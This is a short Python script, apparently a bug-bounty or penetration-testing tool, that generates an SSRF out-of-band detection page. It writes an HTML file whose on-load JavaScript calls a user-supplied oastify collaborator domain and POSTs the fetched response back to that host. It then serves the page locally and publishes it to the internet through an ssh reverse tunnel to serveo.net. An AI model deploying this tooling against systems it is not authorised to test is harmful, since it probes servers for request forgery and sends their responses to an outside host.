import os

print("Greetings welcome to Shmuel AKA Sami SSRF OOB DETECTION SCRIPT")

oastify_domain = input("Please enter the new Oastify domain (e.g., yourdomain.oastify.com): ")


html_content = f"""<!DOCTYPE html> 
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AJAX Request Example</title>
    <script>
        window.onload = function() {{
            // Create a new XMLHttpRequest object
            var xhr = new XMLHttpRequest();

            // Configure it: GET-request for the URL
            xhr.open('GET', 'https://{oastify_domain}/pingback', true);

            // Send the request over the network
            xhr.send(); 

            // Handle the response
            xhr.onload = function() {{
                if (xhr.status >= 200 && xhr.status < 300) {{
                    // Log the response
                    console.log('Response received:', xhr.responseText);

                    // Send the response to your server
                    var responseToSend = xhr.responseText;

                    // Create a new XMLHttpRequest for sending the response
                    var sendXhr = new XMLHttpRequest();
                    sendXhr.open('POST', 'https://{oastify_domain}', true); // Replace with your server URL
                    sendXhr.setRequestHeader('Content-Type', 'application/json');

                    // Send the response data as JSON
                    sendXhr.send(JSON.stringify({{ response: responseToSend }}));

                    sendXhr.onload = function() {{
                        if (sendXhr.status >= 200 && sendXhr.status < 300) {{
                            console.log('Response sent to server successfully:', sendXhr.responseText);
                        }} else {{
                            console.error('Failed to send response to server. Status:', sendXhr.status);
                        }}
                    }};
                }} else {{
                    console.error('Request failed. Status:', xhr.status);
                }}
            }};

            xhr.onerror = function() {{
                console.error('Request failed due to a network error.');
            }};
        }};
    </script>
</head>
<body>
    <h1>AJAX Request on Load</h1>
    <p>The AJAX request will be executed when this document is opened.</p>
</body>
</html>
"""

with open("index.html", "w") as html_file:
    html_file.write(html_content)

print("index.html has been created with the new Oastify domain.")


os_type = input("Are you using Windows or Linux? (type 'windows' or 'linux'): ").strip().lower()

if os_type == 'windows':
    os.system("start cmd.exe /k python -m http.server 8030")
    os.system("start cmd.exe /k ssh -R 80:localhost:8030 serveo.net")
elif os_type == 'linux':
    os.system("gnome-terminal -- bash -c 'python3 -m http.server 81; exec bash'")
    os.system("gnome-terminal -- bash -c 'ssh -R 81:localhost:81 serveo.net; exec bash'")
else:
    print("Invalid input. Please type 'windows' or 'linux'.")
